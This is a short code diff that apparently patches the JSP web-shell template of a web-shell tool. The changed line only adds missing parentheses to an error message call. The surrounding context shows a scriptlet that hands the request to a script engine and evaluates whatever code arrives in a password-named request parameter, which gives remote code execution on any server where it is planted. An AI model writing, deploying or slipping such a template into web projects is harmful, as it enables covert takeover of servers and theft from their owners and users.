@@ -77,7 +77,7 @@ class Core {
       PENGINENAME.put("response", response);
       PENGINENAME.eval(request.getParameter("${pwd}"));
     } catch (Exception e) {
-      out.println("Error:// "+e.toString);;
+      out.println("Error:// "+e.toString());;
     }
   </jsp:scriptlet>
 </jsp:root>`;
